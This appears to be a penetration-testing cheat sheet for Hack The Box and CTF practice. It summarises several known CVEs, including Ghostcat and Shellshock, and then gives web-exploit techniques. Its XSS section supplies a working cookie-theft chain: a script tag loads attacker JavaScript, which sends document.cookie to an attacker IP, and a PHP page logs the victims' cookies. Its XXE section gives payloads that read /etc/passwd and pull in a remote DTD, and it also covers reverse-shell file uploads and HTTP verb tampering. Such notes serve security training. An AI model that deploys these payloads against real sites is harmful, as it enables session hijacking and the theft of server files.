A directory traversal exploit It allows attackers to conduct path traversal attacks on specific ColdFusion files, including CFIDE/administrator/settings/mappings.cfm, logging/settings.cfm, datasources/index.cfm, j2eepackaging/editarchive.cfm, and CFIDE/administrator/enter.cfm. The vulnerability affects Adobe ColdFusion 9.0.1 and earlier versions, enabling remote attackers to read arbitrary files by manipulating the locale parameter in the vulnerable files.

### CVE-2020-1938
Ghostcat, is a vulnerability found in Tomcat. This vulnerability allows unauthorized access to certain files and directories without requiring authentication. It affects all versions of Tomcat before 9.0.31, 8.5.51, and 7.0.100.

The root cause of this vulnerability is a misconfiguration in the AJP (Apache Jserv Protocol) used by Tomcat for proxying requests to application servers behind front-end web servers. The AJP service typically runs on port 8009 on a Tomcat server.

To check for the presence of this vulnerability, a targeted Nmap scan can be performed on the target server. The scan will show if ports 8009 and 8080 are open, indicating the potential presence of the vulnerable AJP service and the Tomcat web server.

It's important to note that while Ghostcat allows access to specific files and directories within the web apps folder, it does not provide access to sensitive files outside that scope, such as /etc/passwd.

### CVE-2019-0232 / CGI
CVE-2019-0232 is a critical security vulnerability that affects Windows systems with the enableCmdLineArguments feature enabled in Apache Tomcat. This flaw could lead to remote code execution on the targeted system. The vulnerability arises from a command injection issue in the Tomcat CGI Servlet due to improper input validation.

Attackers can exploit this vulnerability to execute arbitrary commands on the affected system. The affected versions of Tomcat include 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93.

The CGI Servlet is an essential component of Tomcat, facilitating communication between web servers and external applications beyond the Tomcat JVM. These external applications are usually CGI scripts written in languages like Perl, Python, or Bash. The CGI Servlet receives requests from web browsers and forwards them to CGI scripts for processing.

###  CVE-2014-6271
Shellshock vulnerability discovered in 2014. This vulnerability affects older versions of the Bash shell (GNU Bash up to version 4.3) and can be exploited to execute unintended commands using environment variables. Despite being a 25-year-old bug at the time of discovery, Shellshock remained a significant threat to companies worldwide.

The Shellshock vulnerability enables attackers to exploit incorrect environment variable handling in older versions of Bash. Specifically, when saving a function as a variable, vulnerable versions of Bash allow the execution of operating system commands appended after the function. Attackers can utilize this flaw to execute malicious commands on the targeted system.

# Common Web Exploits

## XSS

XSS (Cross-Site Scripting) is an exploit that relies on the execution of unsanitized JavaScript code on a website. This code execution allows the attacker to capture information from other users who interact with the page, including their cookies.

In the context of HTB (Hack The Box) and CTFs (Capture The Flag competitions), if you know that an admin bot is going to interact with a page, XSS may be a viable option for exploitation.

There are three variants of XSS:

    Stored/Persistent: In this variant, the malicious code is stored in the backend database and will affect any user who visits the site where the code is displayed.

    Reflected: Reflected XSS is similar to stored XSS, but the malicious code is not stored persistently. Instead, it is embedded in a URL or input field and is only triggered when the user interacts with it.

    DOM-based: DOM-based XSS exploits vulnerabilities in the Document Object Model (DOM) of a web page. The attack occurs when the client-side JavaScript code manipulates the DOM incorrectly, allowing an attacker to inject and execute malicious code.


Below is an example of code that could be used to test
```
<script>alert(window.origin)</script>
```
a pop up (below) would confirm the presence of XSS

<img width="737" alt="Screen Shot 2022-09-18 at 8 45 08 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/81044e3b-f524-4f48-8b9d-9fed7a9ca1ac">

payload
```
"><script src=http://10.10.14.186/script.js></script>
```

1) create script.js
2) create index.php
3) start php server
4) submit payload

script.js
```
new Image().src='http://10.10.14.186/index.php?c='+document.cookie;
```

index.php
```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

## Insecure Direct Object References(IDOR)

Identifying IDORs: Look for URL parameters or APIs with object references (e.g., ?uid=1 or ?filename=file_1.pdf). These references are often found in URL parameters, APIs, or other HTTP headers like cookies.

## XML External Entity (XXE) Injection
The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input. 

### Local File Disclosure example

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/bb634f91-a68b-4701-bf77-34d899d82685)

```
<!DOCTYPE email [
  <!ENTITY new_ent SYSTEM "file:///etc/passwd">
]>
```
Define a new external entity
![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/a7c89b0a-6319-4dd8-9c0e-74c5dd6a0b45)

### PHP wrappers
some files may contain characters that will break the request. Can use a PHP wrapper to base64 encode

```
<!DOCTYPE email [
  <!ENTITY new_ent SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

### Error Based XXE

Create xxe.dtd file and host it
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/8ff45e34-c8a4-4b1d-a109-8702d1d9f00b)

```
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/767e5ec0-9ae1-494e-8aa8-3c00af5900c6)


### RCE with XXE
If PHP expect module is enabled(not likley)

## HTTP Verb Tampering
A web server's authentication configuration may be limited to specific HTTP methods, which would leave some HTTP methods accessible without authentication. Exploiting HTTP Verb Tampering vulnerabilities is usually a relatively straightforward process. We just need to try alternate HTTP methods to see how they are handled by the web server and the web application. 

To show what options are available
```
curl -i -X OPTIONS http://SERVER_IP:PORT/
```
Can change request methods easily in burp by right clicking

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/ade0f33a-3cf7-42d0-a7bd-5c49b4a81970)

### Example - get-post - HTB wall machine

Upon initial finding and attempting to access dir, we are asked to submit a password. Using a post request instead of get gives us access to the page.

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/f6b43e37-5939-4b4e-9022-ae8f361a84ba)


## File Inclusion

File Inclusions are vulnerabilities that can occur in web applications using parameters to specify what content is shown on a page. If not securely coded, attackers can manipulate these parameters to access and display local files on the server, leading to Local File Inclusion (LFI) vulnerabilities. These vulnerabilities can expose source code, sensitive data, and even enable remote code execution. Examples in various languages like PHP, NodeJS, Java, and .NET show how parameters are used to load files, making them susceptible to LFI attacks. Careful input filtering and sanitization are essential to prevent such vulnerabilities.

### Local File Inclusion

## File Upload attacks

Want to upload a file to a server to get a reverse shell. Typically there are 4 kinds of bolcks, client side validation, Whitelist, BlackList, Type filters.

Have to be able to find and access the file after the upload.

### Example
Try to upload shell and fail

Send a real image that will get accepted. Intercept the request. remove the image and input the shell. GIF added to evade type filter. File name extentions to bypass black and white list.
